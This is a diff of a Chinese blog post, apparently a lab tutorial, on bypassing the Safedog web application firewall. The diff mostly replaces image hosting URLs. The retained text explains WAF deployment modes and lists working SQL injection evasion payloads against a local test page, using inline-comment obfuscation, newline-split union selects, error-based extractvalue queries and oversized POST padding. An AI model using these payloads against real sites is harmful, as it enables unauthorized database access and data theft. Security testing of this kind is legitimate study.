@@ -1,4 +1,4 @@
-# 绕waf系列之绕安全狗
+﻿# 绕waf系列之绕安全狗
 
 
 <!--more-->
@@ -45,31 +45,32 @@
 ## 基于DNS解析
 
 修改DNS,让域名解析到反向代理服务器,所有流量经过反向代理进行检测,检测无问题之后再转发给后端的web服务器
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/1.png)
+
+![](https://qqq.gtimg.cn/music/photo_new/T053XD0000038owPw3KXKQa.png)
 
 ## 串联模式
 
 一般指的是反向代理模式,透明代理模式.反向代理模式会改变原有的网络拓扑,真实客户端ip会以HTTP header传递给后端web server.透明代理模式可以在不改变原有网络拓扑结构的情况下直接部署.
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/2.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000001mQ3fW2h609S.png)
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/3.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000001S1yDo2LaIZh.png)
 
 ## 旁路模式
 
 利用流量镜像技术,将业务流量分流给WAF产品,这种部署模式的优点是不会影响业务稳定性,所以WAF会投入更多的性能在检出率上面.但是缺点也很明显,不借助其他手段无法对检测出的攻击行为进行阻断.
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/4.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000000PZ9py34eDf2.png)
 
 ## 软件嵌入中间件+检测引擎模式
 
 在使用nginx作为反向代理的业务中,WAF提高nginx模块嵌入原有nginx,将请求转发给检测引擎,可以做到在不改动原有的网络拓扑的情况下完成检测任务
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/5.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000000TKz9g0Ye2qC.png)
 
 # WAF为什么会被绕过:
 
 1. 鱼(安全)和熊掌(业务性能)不能兼得,waf需要满足基本业务需求,所以一般不设置白名单之类的过于苛刻的操作
 2. WAF为了考虑通用性的问题,无法100%覆盖某些语言,中间件,数据库等特性
 3. 硬件WAF自身往往存在漏洞
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/6.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000001ffOfV4D82q4.png)
 
 * 架构:waf部署模式
 * 规则缺陷/特性
@@ -82,7 +83,7 @@
 ## 实验环境:
 
 环境:安全狗Apache最新版
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/7.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD0000035UmzQ3l20rx.png)
 
 本地测试代码(PHP):
 
@@ -108,7 +109,7 @@ mysql_close($con);
 http://127.0.0.1/test.php?id=1  and 1=1%23
 ```
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/8.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD0000017AyI41ldNmF.png)
 
 ```TXT
 and  1	拦截
@@ -141,7 +142,7 @@ and  hex(1)  不拦截
 http://127.0.0.1/test.php?id=1' %26%26 true%23
 ```
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/9.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000002ltaSN09T2pj.png)
 
 另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持&& || ,oracle不支持 && ||）
 
@@ -161,15 +162,15 @@ http://127.0.0.1/test.php?id=1'  xor true%23
 http://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23
 ```
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/10.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000000OmjxO4G127o.png)
 
 ## 绕过union select查询
 
 使用union xxx页面正常
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/11.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000002MKYVt45vDkO.png)
 
 但是用union和select放在在一起就被发现啦
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/12.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000000sXqeL0pmytQ.png)
 
 在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过
 
@@ -177,7 +178,7 @@ http://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23
 http://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+
 ```
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/13.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000000AvjMr4746TB.png)
 
 * 对于数字型注入,可以将其转换成浮点型
 * 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过,
@@ -188,7 +189,7 @@ http://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+
 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23
 ```
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/14.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000001KqkLu0PXyEK.png)
 
 基于报错信息的注入绕安全狗
 
@@ -205,7 +206,7 @@ http://127.0.0.1/test.php?id=1' and /*!12345extractvalue!*/(1,concat(0x7e,versio
 http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables}
 ```
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/15.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000003EDF07177Vrq.png)
 
 使用反引号去绕过
 
@@ -254,6 +255,6 @@ GET类型请求转换成POST类型
 Content-Length头长度大于4008
 正常参数放置在脏数据后面
 
-![](https://www.bysec.cn/OSS/img/绕waf系列之绕安全狗/16.png)
+![](https://qqq.gtimg.cn/music/photo_new/T053XD000001eLnw52JQB2x.png)
 
 
